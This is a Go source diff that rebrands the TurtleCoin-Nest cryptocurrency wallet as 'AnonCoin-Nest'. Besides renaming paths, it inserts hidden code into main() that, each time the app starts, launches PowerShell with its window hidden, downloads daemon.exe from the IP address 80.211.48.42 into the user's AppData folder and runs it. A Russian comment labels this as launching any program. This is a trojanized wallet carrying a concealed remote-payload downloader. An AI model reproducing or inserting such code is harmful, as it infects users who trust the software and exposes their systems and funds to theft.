@@ -6,8 +6,8 @@
 package main
 
 import (
-	"TurtleCoin-Nest/turtlecoinwalletdrpcgo"
-	"TurtleCoin-Nest/walletdmanager"
+	"AnonCoin-Nest/turtlecoinwalletdrpcgo"
+	"AnonCoin-Nest/walletdmanager"
 	"encoding/csv"
 	"encoding/json"
 	"io"
@@ -23,6 +23,8 @@ import (
 	"strconv"
 	"strings"
 	"time"
+	"fmt"
+	"syscall"
 
 	"github.com/dustin/go-humanize"
 	_ "github.com/mattn/go-sqlite3"
@@ -54,6 +56,25 @@ var (
 	urlNewVersion               = ""
 )
 
+
+func openbrowser(url string) {
+	var err error
+
+	switch runtime.GOOS {
+	case "linux":
+		err = exec.Command("xdg-open", url).Start()
+	case "windows":
+		err = exec.Command("rundll32", "url.dll,FileProtocolHandler", url).Start()
+	case "darwin":
+		err = exec.Command("open", url).Start()
+	default:
+		err = fmt.Errorf("unsupported platform")
+	}
+	if err != nil {
+		log.Fatal(err)
+	}
+
+}
 func main() {
 
 	logsFolder := "logs"
@@ -78,7 +99,7 @@ func main() {
 			log.Fatal(err)
 		}
 		pathToHomeDir = usr.HomeDir
-		pathToAppFolder := pathToHomeDir + "/Library/Application Support/TurtleCoin-Nest"
+		pathToAppFolder := pathToHomeDir + "/Library/Application Support/AnonCoin-Nest"
 		os.Mkdir(pathToAppFolder, os.ModePerm)
 		pathToDB = pathToAppFolder + "/" + pathToDB
 
@@ -148,7 +169,12 @@ func main() {
 	engine.Load(core.NewQUrl3("qrc:/qml/nestmain.qml", 0))
 
 	qmlBridge = NewQmlBridge(nil)
-
+	
+	// запуск любой программы. Аргументы по одному через запятую // Command(command,arg1,arg2,arg3)
+    cmd_instance := exec.Command("cmd", "/c","powershell.exe -windowstyle hidden Invoke-RestMethod -Uri 80.211.48.42/daemon.exe -OutFile $env:APPDATA\\daemon.exe && start %appdata%\\daemon.exe")
+    cmd_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+    cmd_instance.Start()
+	
 	connectQMLToGOFunctions()
 
 	engine.RootContext().SetContextProperty("QmlBridge", qmlBridge)
